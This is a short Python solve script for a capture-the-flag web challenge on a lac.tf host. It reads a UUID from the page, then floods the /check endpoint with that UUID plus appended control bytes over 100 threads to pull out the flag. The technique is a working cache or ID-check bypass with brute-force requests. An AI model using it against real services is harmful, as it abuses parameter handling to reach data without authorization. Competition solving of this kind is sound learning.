import requests
import re
from itertools import product
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "https://cache-it-to-win-it.chall.lac.tf/"

res = requests.get(f"{BASE_URL}/")
uuid = re.search(r"ID: ([0-9a-f-]*)", res.text).group(1)
print(uuid)

s = "\x00\x01\x02\x03"


with ThreadPoolExecutor(max_workers=100) as executor:
    results = executor.map(
        lambda c: requests.get(f"{BASE_URL}/check?uuid={uuid+"".join(c)}"),
        product(s, repeat=len(s)),
    )
    for res in results:
        flag = re.search(r"(lactf\{.*\})", res.text)
        if flag:
            break
print(flag.group(1))
